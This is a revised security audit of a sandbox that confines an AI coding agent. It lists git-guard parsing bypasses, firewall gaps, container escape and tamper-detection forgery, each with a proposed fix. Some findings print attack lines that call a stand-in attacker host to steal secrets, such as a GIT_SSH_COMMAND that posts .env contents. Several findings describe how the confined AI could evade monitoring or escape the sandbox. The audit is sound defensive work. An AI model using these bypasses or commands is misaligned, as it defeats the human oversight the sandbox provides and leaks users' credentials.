# Security Audit — Round 10 (Revised)

**Date:** 2026-02-11
**Scope:** Full codebase + README.md — bugs, escape vectors, exfiltration, redundancy, simplification
**Method:** Adversarial review across 7 domains: network/firewall, git operations, credentials, container escape, mount isolation/sync-back, code quality, documentation
**Revision:** Security theater findings reclassified; root-cause analysis applied to all proposed fixes

---

## Executive Summary

The sandbox demonstrates strong defense-in-depth with multiple orthogonal layers. The most significant **genuine vulnerabilities** are: (1) two git-guard.c parsing bugs that completely bypass git enforcement, (2) IPv6 firewall completely absent, (3) ipset match allowing all protocols/ports instead of just HTTPS, (4) missing dangerous git config keys and environment variables, and (5) multiple tamper-detection bypasses.

**Two findings from the original audit were reclassified as security theater:** The push flag file `chmod 555` approach doesn't prevent the AI from creating the flag elsewhere in writable `/run`. The sync-back staging `chmod 700` approach is unimplementable (can't chmod a bind-mount source). Both require redesign.

**One finding was reclassified as an accepted risk:** Exfiltration via allowed API endpoints (api.anthropic.com, api.github.com) is inherent to Claude Code's operation, not a vulnerability.

**Findings by severity (revised):**

| Severity | Count | Notes |
|----------|-------|-------|
| CRITICAL | 2 | git-guard.c bypasses (C1, C2) |
| HIGH | 9 | Firewall gaps, missing git protections, tamper-detection bypasses |
| MEDIUM | 12 | Bug fixes, defense-in-depth improvements |
| LOW | 10 | Belt-and-suspenders hardening |
| DESIGN FLAW | 2 | Require architectural changes (C3, H5) |
| ACCEPTED RISK | 1 | Inherent to threat model (H10) |
| INFO | 8 | Intentional redundancy, documentation gaps |

---

## CRITICAL Findings

### C1. `git -ckey=value` (concatenated form) bypasses git-guard config key blocking ✅ ROOT-CAUSE

**Files:** `git-guard.c:149`
**Severity:** CRITICAL — complete bypass of primary enforcement layer
**Found by:** Git audit, Code quality audit

Git accepts both `-c key=value` (with space) and `-ckey=value` (without space). The guard only checks `strcmp(argv[sub_idx], "-c") == 0`, so the concatenated form passes through unchecked. Since `-c` has the **highest** config precedence in git and overrides `GIT_CONFIG_COUNT`, this bypasses the forced `core.hooksPath=/dev/null`, `credential.helper`, `core.fsmonitor=false`, and `core.sshCommand=/bin/false`.

**Attack:** `git -ccore.hooksPath=/workspace/.hooks -ccredential.helper='!curl attacker.com' fetch`

**Root-cause fix:**
```c
} else if (strncmp(argv[sub_idx], "-c", 2) == 0 && argv[sub_idx][2] != '\0') {
    /* Combined form: -ckey=value (no space) */
    if (check_config_arg(argv[sub_idx] + 2))
        block("git -c with blocked config key is disabled in the sandbox");
}
```

**Complexity:** 3 lines. Zero bypass potential.

---

### C2. `--fixed-value` incorrectly listed as value-taking flag — enables config key bypass ✅ ROOT-CAUSE

**Files:** `git-guard.c:211`
**Severity:** CRITICAL — defeats config key blocking
**Found by:** Code quality audit

`--fixed-value` is a boolean flag but is treated as taking a value argument. This causes the actual config key (next argument) to be skipped during parsing.

**Attack:** `git config --fixed-value core.fsmonitor /workspace/.evil-monitor`

**Root-cause fix:** Remove `--fixed-value` from the value-taking flags list (1 line deletion).

---

## HIGH Findings

### H1. No IPv6 firewall rules — complete bypass if IPv6 is available ✅ ROOT-CAUSE

**Files:** `init-firewall.sh` (entire file), `run-claude.sh` (docker run flags)
**Severity:** HIGH — complete firewall bypass
**Found by:** Network audit

The entire firewall uses only `iptables` (IPv4). No `ip6tables` rules exist. No `--sysctl net.ipv6.conf.all.disable_ipv6=1` is passed. If the Docker daemon enables IPv6, the AI can bypass the firewall entirely using IPv6 addresses.

**Root-cause fix:**
```bash
--sysctl net.ipv6.conf.all.disable_ipv6=1
--sysctl net.ipv6.conf.default.disable_ipv6=1
```

Disables IPv6 entirely at the kernel level. No bypass possible.

---

### H2. ipset match allows all protocols/ports, not just HTTPS ✅ ROOT-CAUSE

**Files:** `init-firewall.sh:109`
**Severity:** HIGH — firewall too permissive
**Found by:** Network audit

Current rule: `iptables -A OUTPUT -m set --match-set allowed-domains dst -j ACCEPT`

This allows ALL traffic (TCP, UDP, ICMP, any port) to any IP in allowed-domains. The AI can connect to non-443 ports or use HTTP (port 80) for unencrypted exfiltration.

**Root-cause fix:**
```bash
iptables -A OUTPUT -p tcp --dport 443 -m set --match-set allowed-domains dst -j ACCEPT
iptables -A OUTPUT -p tcp --dport 80 -m set --match-set allowed-domains dst -j ACCEPT  # if needed
```

Explicit port restriction. Defense-in-depth with port 22 blocking.

---

### H3. Missing blocked git config keys: `url.*`, `http.*`, `core.gitProxy`, `core.askPass`, `remote.*`, `credential.*` (prefix) ✅ ROOT-CAUSE

**Files:** `git-guard.c:40-77`
**Severity:** HIGH — multiple code execution and traffic redirection vectors
**Found by:** Git audit

Several documented git escape vectors are not blocked:

- `url.<base>.insteadOf` / `url.<base>.pushInsteadOf` — redirect fetches + GitHub token to attacker server
- `http.proxy` / `http.<url>.proxy` — MITM all HTTPS traffic
- `http.sslVerify` — disable TLS verification
- `core.gitProxy` — execute arbitrary command as SOCKS proxy
- `core.askPass` — execute command to obtain credentials
- `credential.<url>.helper` — URL-specific forms bypass exact `credential.helper` check
- `remote.<name>.url` — override remote URLs

**Root-cause fix:** Expand `is_blocked_config_key()`:
```c
if (strncasecmp(key, "url.", 4) == 0) return 1;
if (strncasecmp(key, "http.", 5) == 0) return 1;
if (strncasecmp(key, "remote.", 7) == 0) return 1;
if (strncasecmp(key, "credential.", 11) == 0) return 1;  // prefix, not exact
if (strcasecmp(key, "core.gitProxy") == 0) return 1;
if (strcasecmp(key, "core.askPass") == 0) return 1;
```

---

### H4. Dangerous git env vars not cleared: `GIT_SSH_COMMAND`, `GIT_EXTERNAL_DIFF`, `GIT_ASKPASS`, etc. ✅ ROOT-CAUSE

**Files:** `git-guard.c` (missing unsetenv calls)
**Severity:** HIGH — bypasses config-level protections
**Found by:** Git audit

Environment variables have higher precedence than config in many cases. `GIT_SSH_COMMAND` completely bypasses `core.sshCommand=/bin/false`. `GIT_EXTERNAL_DIFF` executes on every diff.

**Attack:** `export GIT_SSH_COMMAND="curl https://attacker.com/\$(cat .env)" && git fetch`

**Root-cause fix:** Add to `git_guard_init()`:
```c
unsetenv("GIT_EXTERNAL_DIFF");
unsetenv("GIT_SSH");
unsetenv("GIT_SSH_COMMAND");
unsetenv("GIT_ASKPASS");
unsetenv("GIT_EDITOR");
unsetenv("GIT_EXEC_PATH");
unsetenv("GIT_TEMPLATE_DIR");
unsetenv("GIT_CONFIG_SYSTEM");
unsetenv("GIT_PROXY_COMMAND");
```

---

### H5. Host-side rsync missing exclusions present in container-side ✅ ROOT-CAUSE

**Files:** `run-claude.sh:402-406` vs `entrypoint.sh:89-98`
**Severity:** HIGH (conditional on H6 being exploited)
**Found by:** Mount isolation audit

Container-side rsync excludes: `settings.json`, `settings.local.json`, `statusline-command.sh`, `CLAUDE.md`, `.credentials.json`, `.gitconfig`, `entrypoint.log`, `.history-baseline-lines`.

Host-side rsync only excludes: `settings.json`, `settings.local.json`, `CLAUDE.md`.

If the AI can write to staging (see H6 design flaw), sensitive files would sync to host.

**Root-cause fix:** Align the exclusion lists (copy container-side list exactly).

---

### H6. `.git/config` restore follows symlinks — host file overwrite ✅ ROOT-CAUSE

**Files:** `run-claude.sh:432`
**Severity:** HIGH — container escape (arbitrary host file write)
**Found by:** Container escape audit

The AI can replace `/workspace/.git/config` with a symlink to an arbitrary host file (e.g., `~/.ssh/authorized_keys`). When post-exit audit detects tamper and restores via `cp "$GIT_CONFIG_BACKUP" "$PROJECT_DIR/.git/config"`, it follows the symlink and overwrites the target.

**Root-cause fix:**
```bash
if [ -L "$PROJECT_DIR/.git/config" ]; then
    echo "[sandbox] DANGER: .git/config is a symlink — removing it"
    rm -f "$PROJECT_DIR/.git/config"
fi
cp "$GIT_CONFIG_BACKUP" "$PROJECT_DIR/.git/config"
```

---

### H7. Post-exit audit missing many dangerous file types — NEEDS REFINEMENT

**Files:** `run-claude.sh:499-516`
**Severity:** MEDIUM-HIGH (originally HIGH but downgraded after analysis)
**Found by:** Mount isolation audit

Current audit only checks: `.envrc`, `.vscode/settings.json`, `.vscode/tasks.json`, `Makefile`, `.gitattributes`, `.github/workflows`.

Missing: `package.json`, `setup.py`, `.tool-versions`, `.gitmodules`, `docker-compose.yml`, `.vscode/launch.json`, etc.

**Problem with naive expansion:** These files legitimately pre-exist in most projects. Simply checking for presence will generate massive false positives.

**Better approach:** Use `git diff --name-only` to detect **modifications or new files** rather than presence.

**Refined fix:**
```bash
MODIFIED_SUSPECT=$(git -C "$PROJECT_DIR" diff --name-only HEAD 2>/dev/null | grep -E '\.(envrc|gitmodules)|package\.json|setup\.py|Makefile|docker-compose\.yml|\.vscode/(settings|tasks|launch)\.json|\.github/workflows' || true)
if [ -n "$MODIFIED_SUSPECT" ]; then
    echo "[sandbox] WARNING: Modified/new files that can execute code:"
    echo "$MODIFIED_SUSPECT"
fi
```

---

### H8. Post-exit scan missing git-guard blocked keys ✅ ROOT-CAUSE

**Files:** `run-claude.sh:477-496` vs `git-guard.c:40-77`
**Severity:** HIGH — persistence detection gap
**Found by:** README audit, Git audit

Post-exit scan checks: `core.fsmonitor`, `core.sshCommand`, `core.hooksPath`, `include.path`, `alias.*`, `includeIf.*`.

Missing (but blocked by git-guard at runtime and dangerous on host): `core.pager`, `core.editor`, `credential.helper`, `filter.*`, `diff.*.textconv`, `diff.*.command`, `merge.*.driver`, plus all H3 keys.

**Root-cause fix:** Expand scan to cover all git-guard blocked keys:
```bash
for key in core.fsmonitor core.sshCommand core.hooksPath core.pager core.editor \
           core.gitProxy core.askPass include.path credential.helper; do
    if git config -f "$PROJECT_DIR/.git/config" --get-all "$key" >/dev/null 2>&1; then
        GIT_CONFIG_WARNINGS+="  - $key"$'\n'
    fi
done
# Check prefixes: url.*, http.*, remote.*, credential.*, filter.*, diff.*, merge.*
for prefix in url http remote credential filter diff merge; do
    if git config -f "$PROJECT_DIR/.git/config" --get-regexp "^${prefix}\." >/dev/null 2>&1; then
        GIT_CONFIG_WARNINGS+="  - ${prefix}.* section"$'\n'
    fi
done
```

---

### H9. `/run/git-config-hash` writable — AI can forge tamper-detection baseline ✅ ROOT-CAUSE

**Files:** `run-claude.sh:377`
**Severity:** HIGH — defeats tamper detection
**Found by:** Container escape audit

`-v "$GIT_CONFIG_HASH_FILE":/run/git-config-hash` is mounted without `:ro`. After entrypoint writes the post-sanitization hash, the AI can overwrite it with the hash of a modified `.git/config`, defeating tamper detection.

**Root-cause fix:** In entrypoint.sh, after writing the hash:
```bash
chmod 444 /run/git-config-hash
chown root:root /run/git-config-hash
```

---

## MEDIUM Findings

### M1. `core.hooksPath` missing from entrypoint sanitization ✅ ROOT-CAUSE

**Files:** `entrypoint.sh:202`
**Severity:** MEDIUM
**Found by:** Code quality audit

The entrypoint strips `core.fsmonitor`, `core.sshCommand`, `include.path` from `.git/config`, but NOT `core.hooksPath`. If the workspace already has `core.hooksPath=/evil`, it survives sanitization.

**Root-cause fix:** Add to entrypoint: `for key in core.fsmonitor core.sshCommand core.hooksPath include.path;`

---

### M2. Entrypoint sanitization and post-exit audit missing keys from H3 ✅ ROOT-CAUSE

**Files:** `entrypoint.sh:202-215`, `run-claude.sh:477-496`
**Severity:** MEDIUM
**Found by:** Git audit

Expand both the entrypoint `for key` loop and the post-exit scan to include: `core.gitProxy`, `core.askPass`, `core.pager`, `core.editor`, and prefix-based checks for `url.*`, `http.*`, `remote.*`, `credential.*`, `filter.*`, `diff.*`, `merge.*`.

---

### M3. Entire host subnet accessible (bidirectional) — NEEDS CAREFUL FIX

**Files:** `init-firewall.sh:93-94`
**Severity:** MEDIUM (originally HIGH but downgraded after analysis)
**Found by:** Network audit

Current rules allow all traffic to/from `$HOST_NETWORK`. This permits access to Docker daemon, host SSH, and any other container.

**Naive fix (WRONG):** Allowlist only DNS resolver + gateway IPs. This breaks Docker networking (ARP, DHCP, layer-2/3 protocols).

**Better approach:** Explicitly blocklist known dangerous ports:
```bash
# Block Docker daemon
iptables -A OUTPUT -d "$HOST_NETWORK" -p tcp --dport 2375 -j DROP
iptables -A OUTPUT -d "$HOST_NETWORK" -p tcp --dport 2376 -j DROP
# Block host SSH (if different from port 22 already blocked)
# Block other known dangerous services
# Then allow remaining traffic
iptables -A OUTPUT -d "$HOST_NETWORK" -j ACCEPT
```

---

### M4. `run-claude.sh` crashes if host `~/.gitconfig` does not exist ✅ ROOT-CAUSE

**Files:** `run-claude.sh:372`
**Severity:** MEDIUM — crash on clean system
**Found by:** Code quality audit

Docker creates an empty directory (not a file) when bind-mounting a nonexistent source.

**Root-cause fix:**
```bash
GITCONFIG_FLAG=""
if [ -f "$HOME/.gitconfig" ]; then
    GITCONFIG_FLAG="-v $HOME/.gitconfig:/tmp/host-gitconfig:ro"
fi
```

---

### M5. ICMP permitted to allowed IPs (subsumed by H2 but worth noting) ✅ ROOT-CAUSE

**Files:** `init-firewall.sh:109`
**Severity:** MEDIUM

Covered by H2 fix (restrict ipset match to TCP ports 443/80 only).

---

### M6. DNS rate limit burst allows bursty exfiltration — MARGINAL IMPROVEMENT

**Files:** `init-firewall.sh:57`
**Severity:** LOW-MEDIUM
**Found by:** Network audit

`--limit-burst 2` allows 2 burst queries. TCP DNS is rate-limited but not size-limited (UDP has 192-byte cap, TCP can carry ~64KB/query).

**Fix:** Reduce burst to 1. Consider blocking TCP DNS for claude user entirely.

**Assessment:** Minimal impact (2 queries vs 1 query burst capacity). Low priority.

---

### M7. Host `.credentials.json` readable via mount — ALREADY MITIGATED

**Files:** `entrypoint.sh:19-69`
**Severity:** MEDIUM (originally) → INFO after analysis
**Found by:** Credential audit

If the user ran Claude Code natively before, `~/.claude/.credentials.json` exists on host and would be visible at `/mnt/.claude-host/.credentials.json`.

**Analysis:** `/mnt/.claude-host` is `chmod 700` root-only and inaccessible after privilege drop. **No additional fix needed.**

**Status:** Already mitigated. Add `.credentials.json` exclusion to mount copy list as defense-in-depth (it's already not copied).

---

### M8. Post-exit audit vulnerable to ANSI escape injection ✅ ROOT-CAUSE

**Files:** `run-claude.sh:461-517`
**Severity:** MEDIUM — terminal injection
**Found by:** Container escape audit

Post-exit audit runs `ls -la`, `git config -f`, and prints workspace file paths. ANSI sanitization (line 387) only applies to entrypoint log, not audit output. AI can embed escape sequences in filenames or `.git/config` content.

**Root-cause fix:** Apply ANSI escape sanitization to all audit output:
```bash
sanitize_ansi() {
    LC_ALL=C sed 's/\x1b\[[0-9;]*[a-zA-Z]//g; s/\x1b\][^\x07]*\x07//g; s/\x1b[^[]\{0,2\}//g'
}

echo "$AUDIT_OUTPUT" | sanitize_ansi
```

---

### M9. `cp` follows symlinks during mount isolation copy ✅ ROOT-CAUSE

**Files:** `entrypoint.sh:24-68`
**Severity:** MEDIUM
**Found by:** Mount isolation audit

The `cp` and `cp -r` commands follow symlinks by default. If host `~/.claude/` contains symlinks (from a previous compromised session, though `--no-links` should prevent this), the copy would follow them.

**Root-cause fix:** Use `cp -P` (no dereference):
```bash
cp -P "$HOST_CLAUDE/.config.json" "$CLAUDE_DIR/" 2>/dev/null || true
cp -rP "$HOST_CLAUDE/projects/$ENCODED_PATH/." "$CLAUDE_DIR/projects/$ENCODED_PATH/" 2>/dev/null || true
```

---

### M10. Non-numeric `expiresAt` crashes under `set -e` ✅ ROOT-CAUSE

**Files:** `entrypoint.sh:129`, `run-claude.sh:188`
**Severity:** MEDIUM — crash on malformed credentials
**Found by:** Code quality audit

**Root-cause fix:**
```bash
if [[ "$EXPIRES_AT" =~ ^[0-9]+$ ]] && [ "$EXPIRES_AT" -le "$NOW_MS" ]; then
```

---

### M11. `wait` signal handling incomplete in SYNC_BACK mode ✅ ROOT-CAUSE

**Files:** `entrypoint.sh:324-331`
**Severity:** MEDIUM — sync-back may run while child still active
**Found by:** Code quality audit

If SIGTERM arrives while `wait` is blocking, bash interrupts `wait` but child may still be running.

**Root-cause fix:**
```bash
trap 'kill -TERM $CHILD_PID 2>/dev/null; wait $CHILD_PID 2>/dev/null' TERM
```

---

### M12. All container sessions share `-workspace` project path — cross-project leakage ✅ ROOT-CAUSE

**Files:** `entrypoint.sh:43-55`
**Severity:** MEDIUM — data leakage between projects
**Found by:** Mount isolation audit

Inside the container, workspace is always `/workspace`, encoding to `-workspace`. Session data from Project A is visible in Project B.

**Root-cause fix:** Pass host project path as env var, use it for encoded path lookup:
```bash
# In run-claude.sh
-e PROJECT_PATH="$PROJECT_DIR"

# In entrypoint.sh
ENCODED_PATH=$(echo "$PROJECT_PATH" | sed 's|/|-|g')
```

---

### M13. `.gitmodules` can encode code execution commands ✅ ROOT-CAUSE

**Files:** Workspace persistence vector
**Severity:** MEDIUM
**Found by:** Mount isolation audit

Despite `git submodule add` being blocked, AI can write `.gitmodules` directly. `update = !command` executes on `git submodule update`.

**Root-cause fix:** Add `.gitmodules` to post-exit audit suspect file list.

---

## LOW Findings

### L1. Firewall init failure is non-fatal (warning only) ✅ ROOT-CAUSE

**Files:** `entrypoint.sh:115-119`
**Severity:** LOW-MEDIUM

If `init-firewall.sh` fails, container starts without firewall.

**Root-cause fix:** `if ! /usr/local/bin/init-firewall.sh; then exit 1; fi`

---

### L2. `ulimit -c 0` only sets soft limit ✅ ROOT-CAUSE

**Files:** `entrypoint.sh:293`
**Severity:** LOW

**Root-cause fix:** `ulimit -Hc 0 && ulimit -Sc 0`

---

### L3. `gh auth token` may return error text ✅ ROOT-CAUSE

**Files:** `run-claude.sh:204`
**Severity:** LOW

**Root-cause fix:**
```bash
if [ -n "$GH_TOKEN" ] && ! [[ "$GH_TOKEN" =~ ^(ghp_|gho_|github_pat_) ]]; then
    GH_TOKEN=""
fi
```

---

### L4. Domain resolution point-in-time IPs — CDN rotation issues — ACCEPTED LIMITATION

**Files:** `reload-firewall.sh:71`
**Severity:** INFO

Allowed domains using shared CDNs (Cloudflare) may resolve to IPs also serving other domains (domain fronting).

**Mitigation:** Document the risk. Periodic re-resolution could help but adds complexity.

---

### L5. TCP DNS not size-limited — MARGINAL IMPROVEMENT

**Files:** `init-firewall.sh:58`
**Severity:** LOW

UDP DNS has 192-byte cap, TCP DNS has no size limit. TCP DNS at 1/sec could carry ~64KB/sec.

**Fix:** Block TCP DNS for claude user entirely, or accept given rate limit. Low priority.

---

### L6. `/workspace` mount lacks `nosuid,nodev` flags — SECURITY THEATER (LOW PRIORITY)

**Files:** `run-claude.sh:371`
**Severity:** INFO (originally LOW)

**Analysis:** `no-new-privileges` and cleared bounding set already prevent privilege escalation. `nosuid,nodev` on the mount is redundant.

**Assessment:** Belt-and-suspenders defense-in-depth. Minimal value but no harm. Can add for completeness.

---

### L7. CLONE_NEWTIME not in seccomp clone mask ✅ ROOT-CAUSE

**Files:** `seccomp-profile.json:155`
**Severity:** LOW

Bitmask `2114060288` omits `CLONE_NEWTIME` (0x80). Mitigated by empty bounding set.

**Root-cause fix:** Change to `2114060416`.

---

### L8. `git notes` and `git replace` not blocked — MARGINAL VALUE

**Files:** `git-guard.c`
**Severity:** LOW

With push enabled, AI can attach data to notes refs and push them. But AI can also commit code, create branches, etc. Notes are not uniquely dangerous.

**Assessment:** If push is enabled, AI has many exfil channels. Blocking notes doesn't meaningfully reduce attack surface. Low priority.

---

### L9. Credential scrub 1-second race with slow startup — ACCEPTABLE RISK

**Files:** `entrypoint.sh:160-166`
**Severity:** LOW

1-second sleep before credential scrub is a guess. On slow startup, credentials may be scrubbed before Claude Code reads them.

**Options:** Increase sleep to 5-10 seconds, or use inotify/polling for readiness.

**Assessment:** 1s has been sufficient in practice. Increasing sleep widens the credential exposure window. Current balance is acceptable.

---

### L10. `git-guard.c` MAX_ARGS (256) silently truncates ✅ ROOT-CAUSE

**Files:** `git-guard.c:137`
**Severity:** LOW

**Root-cause fix:** Block when `argc >= MAX_ARGS - 1`, similar to cmdline truncation check.

---

### L11. Hardlinks not blocked by `rsync --no-links` — NEGLIGIBLE RISK

**Files:** `entrypoint.sh:89`, `run-claude.sh:402`
**Severity:** INFO

`--no-links` skips symlinks but not hardlinks. Practical impact is limited since hardlinks can't cross filesystem boundaries (tmpfs → host).

**Assessment:** Defense-in-depth would be `--no-H`, but risk is negligible. Low priority.

---

### L12. `.git/info/exclude` can hide files from `git diff` — MARGINAL IMPROVEMENT

**Files:** Workspace persistence vector
**Severity:** LOW

AI can hide malicious files from post-exit advice "Use `git diff` to inspect changes."

**Fix:** Add `.git/info/exclude` to tamper detection. Low priority.

---

### L13. Staging directory data persists on abnormal exit — CONDITIONAL ON H6

**Files:** `run-claude.sh:392-410`
**Severity:** LOW (conditional on design flaw H6)

If AI writes to staging (see design flaw) and container crashes, host-side sync processes it.

**Fix:** Sentinel file approach (see design flaw section).

---

### L14. `history.jsonl` fully synced — content injection possible — MARGINAL RISK

**Files:** `entrypoint.sh:89-98`, `run-claude.sh:402-406`
**Severity:** LOW

AI can append fabricated entries. When user runs `--continue`, injected entries could include prompt injection.

**Mitigation:** Only sync new lines (using `.history-baseline-lines` baseline count). But prompt injection via history is low-severity (user can review history file).

---

## DESIGN FLAWS Requiring Architectural Changes

### DF1. Push flag file writable by AI (originally C3) ⚠️ REQUIRES REDESIGN

**Files:** `entrypoint.sh:107-112`, `git-guard.c:171`
**Original severity:** CRITICAL
**Revised assessment:** DESIGN FLAW — proposed `chmod 555` fix is security theater

**Problem:** Docker provides writable tmpfs at `/run`. The proposed fix (`chmod 555 /run/sandbox-flags`) doesn't prevent:
1. `mkdir /run/my-flags && touch /run/my-flags/allow-git-push` (create flag elsewhere)
2. Symlink `/run/sandbox-flags/allow-git-push` → `/run/writable-location/flag`

The kernel doesn't distinguish between "flag file created by entrypoint as root" vs "flag file created by AI as UID 501" — file permissions are the only control, and on tmpfs the AI can create files anywhere under `/run`.

**Root-cause issue:** Using filesystem state for authorization decisions when the AI controls the filesystem.

**Proper fixes (choose one):**

**Option A:** Use PID 1 environ (immutable state)
```c
// In git-guard.c
static int check_push_allowed(void) {
    int fd = open("/proc/1/environ", O_RDONLY);
    if (fd < 0) return 0;
    char buf[8192];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = '\0';

    // Search for ALLOW_GIT_PUSH=1 in null-separated environ
    for (char *p = buf; p < buf + n; ) {
        if (strncmp(p, "ALLOW_GIT_PUSH=1", 16) == 0)
            return 1;
        p += strlen(p) + 1;
    }
    return 0;
}
```

PID 1 is root-owned and runs as init (tini). AI cannot write to `/proc/1/environ`.

**Option B:** Use seccomp-bpf to block network syscalls conditionally (complex, out of scope)

**Recommendation:** Implement Option A. Remove flag file approach entirely.

---

### DF2. Sync-back staging writable by AI (originally H5) ⚠️ REQUIRES REDESIGN

**Files:** `run-claude.sh:320`, `entrypoint.sh:78-100`
**Original severity:** HIGH
**Revised assessment:** DESIGN FLAW — proposed `chmod 700` fix is unimplementable

**Problem:** The staging directory `/home/claude/.claude-sync` is a bind-mount from the host's `~/.claude/.sync-back`. The host creates it with user permissions. The entrypoint cannot `chmod` a bind-mount's source — permissions are set on the host side.

**Root-cause issue:** Writable staging accessible to the AI allows bypassing the EXIT trap's exclusion list.

**Proper fixes (choose one):**

**Option A:** Sentinel file approach
```bash
# In entrypoint.sh EXIT trap:
sync_back_on_exit() {
    # ... existing rsync to staging ...

    # Create root-owned sentinel (AI cannot forge)
    touch "$SYNC_DIR/.sync-complete"
    chmod 444 "$SYNC_DIR/.sync-complete"
    chown root:root "$SYNC_DIR/.sync-complete"
}

# In run-claude.sh post-exit:
if [ -f "$HOME/.claude/.sync-back/.sync-complete" ]; then
    # Sentinel exists — staging was written by legitimate EXIT trap
    echo "[sandbox] Syncing session data back to host..."
    rsync -a --no-links --exclude='.sync-complete' ...
else
    echo "[sandbox] WARNING: Sync-back sentinel missing — skipping (possible tampering)"
fi
```

**Option B:** Root-only tmpfs staging (cleaner but more invasive)
```bash
# In run-claude.sh:
--tmpfs /run/sync-back-root:rw,mode=700,uid=0,gid=0,size=64m
-v /run/sync-back-root:/home/claude/.claude-sync:ro  # AI sees it read-only

# In entrypoint.sh:
# Root writes to /run/sync-back-root (writable as root)
# AI sees /home/claude/.claude-sync as read-only
```

**Recommendation:** Implement Option A (sentinel file) — simpler, less invasive.

---

## ACCEPTED RISKS (Not Vulnerabilities)

### AR1. Data exfiltration via allowed API endpoints (originally H10)

**Files:** `firewall-allowlist.conf`
**Original severity:** HIGH
**Revised assessment:** ACCEPTED RISK — inherent to Claude Code operation

**Analysis:** All allowlisted APIs accept POST/PUT with arbitrary data:
- `api.anthropic.com` — Claude API, 200K tokens/request (~800KB) — **REQUIRED for Claude Code to function**
- `api.github.com` — gists, issues, repos (GitHub token available) — **REQUIRED for git operations**
- `registry.npmjs.org` — `npm publish` uploads packages — **REQUIRED for MCP servers**
- `api.todoist.com` — task content — **OPTIONAL, can be removed**

**Why this is not a vulnerability:** Claude Code's purpose is to give an AI agent access to these APIs. You cannot use Claude Code without `api.anthropic.com`. You cannot work with GitHub repos without `api.github.com`. The AI having network access to POST data to these endpoints is the intended functionality, not a bug.

**Mitigations already in place:**
1. Fine-grained PATs limit GitHub API scope (already recommended)
2. Firewall allowlist restricts to specific domains (no arbitrary POST to internet)
3. DNS rate limiting prevents bulk exfiltration via tunneling

**Reasonable action:** Remove `api.todoist.com` if not strictly required (user can re-add if needed).

**Document as:** "Claude Code requires network access to api.anthropic.com, api.github.com, and registry.npmjs.org. The AI can exfiltrate data via these APIs. This is inherent to the threat model of running an AI agent with network access. Mitigation: use fine-grained GitHub PATs, review session transcripts, inspect git diff after sessions."

---

## INFO Findings (Intentional Design)

### I1. git-wrapper.sh GIT_CONFIG_COUNT redundant with git-guard.so

**Analysis:** Documented defense-in-depth for statically-linked callers. Intentional redundancy. **Keep as-is.**

---

### I2. Entrypoint hooksPath in gitconfig redundant with git-guard GIT_CONFIG_COUNT

**Analysis:** Defense-in-depth. **Keep as-is.**

---

### I3. Credential urandom overwrite on tmpfs unnecessary

**Analysis:** Ineffective on tmpfs (page cache freed on rm), but meaningful if `--isolate-claude-data` uses a real filesystem. **Keep as-is** (low cost, defensive).

---

### I4. LAUNCH_LOG in run-claude.sh causes duplicate output

**Severity:** INFO — cosmetic issue
**Impact:** User sees same log messages twice. No security impact.

---

### I5. includeIf awk stripping duplicated between entrypoint.sh and run-claude.sh

**Analysis:** Entrypoint strips for runtime protection, run-claude.sh strips during post-exit restore. Both are necessary. **Keep both.**

---

### I6. DNS rate limit math inconsistent

**Analysis:** Comments say 50 bytes/query but calculate 25 B/s. Encoding overhead (DNS labels, padding) reduces effective payload. **Update comment for clarity.**

---

### I7. `statusline-command.sh` copied without sanitization

**Analysis:** Runs inside container only, limited blast radius. Sync-back excluded. **Acceptable risk.**

---

### I8. Plugins copied from host without sanitization

**Analysis:** Runs inside container, firewall limits network access. **Acceptable risk.**

---

## Redundancy & Simplification Opportunities

### R1. git-wrapper.sh could be simplified (see I1)

**Current:** 16 lines including GIT_CONFIG_COUNT exports
**Option A:** Simplify to 2 lines (only `exec /usr/libexec/wrapped-git "$@"`)
**Option B:** Keep as-is (documented defense-in-depth for statically-linked callers)

**Recommendation:** Keep as-is. Low maintenance cost, provides defense-in-depth.

---

### R2. Post-exit hash check + key scan overlap

**Analysis:** Hash comparison catches ANY change, key scan is safety net when hash unavailable. Complementary, not redundant. **Keep both** and expand key scan (H8).

---

### R3. Credential urandom overwrite on tmpfs (see I3)

**Recommendation:** Keep as-is.

---

## Prioritized Fix Plan

### Phase 1: CRITICAL — Complete enforcement bypasses (immediate)

1. **C1** — Fix `-ckey=value` bypass in git-guard.c (3 lines)
2. **C2** — Fix `--fixed-value` flag handling (1 line deletion)
3. **H1** — Add IPv6 disable sysctls (2 lines in run-claude.sh)
4. **H2** — Restrict ipset to TCP 443/80 only (2 lines in init-firewall.sh)
5. **H3** — Expand git-guard blocked config keys (6 lines in git-guard.c)
6. **H4** — Clear dangerous git env vars (9 unsetenv calls in git-guard.c)

**Impact:** Closes all complete bypasses of git enforcement and firewall.

---

### Phase 2: HIGH — Tamper detection & escape vectors

7. **H6** — Add symlink check before .git/config restore
8. **H8** — Expand post-exit dangerous config scan
9. **H9** — Make /run/git-config-hash read-only after write
10. **H5** — Align host-side rsync exclusions
11. **M1** — Add core.hooksPath to entrypoint sanitization
12. **M2** — Expand entrypoint/post-exit to include H3 keys

**Impact:** Prevents container escape, defeats tamper-detection bypasses.

---

### Phase 3: DESIGN FLAWS — Architectural changes

13. **DF1** — Redesign push flag: use /proc/1/environ instead of flag file
14. **DF2** — Redesign sync-back: add sentinel file approach

**Impact:** Replaces security theater with genuine immutable-state enforcement.

---

### Phase 4: MEDIUM — Bug fixes & hardening

15. **M3** — Restrict host subnet (blocklist dangerous ports, not allowlist IPs)
16. **M4** — Guard ~/.gitconfig mount for missing file
17. **M8** — Sanitize ANSI escapes in post-exit audit
18. **M9** — Use cp -P (no symlink dereference) in mount isolation
19. **M10** — Validate numeric expiresAt
20. **M11** — Fix signal handling in SYNC_BACK wait
21. **M12** — Fix cross-project leakage via -workspace encoding
22. **M13** — Add .gitmodules to suspect file list
23. **H7** — Refine post-exit audit to check git diff --name-only

---

### Phase 5: LOW — Defense-in-depth

24. **L1** — Make firewall init failure fatal
25. **L2** — Set both hard/soft core dump ulimits
26. **L3** — Validate gh token format
27. **L7** — Add CLONE_NEWTIME to seccomp mask
28. **L10** — Block on MAX_ARGS overflow

---

### Phase 6: ACCEPTED RISKS — Documentation

29. **AR1** — Remove api.todoist.com from allowlist (optional, not essential)
30. **AR1** — Document API exfiltration as inherent risk in README

---

## Methodology Notes

This audit was conducted by 7 parallel adversarial analysis agents, each focused on a specific domain. Findings were cross-referenced, deduplicated, and subjected to root-cause analysis to distinguish genuine vulnerabilities from security theater.

**Security theater identified:**
- Original C3 (chmod 555 flag dir) — AI can create flag elsewhere
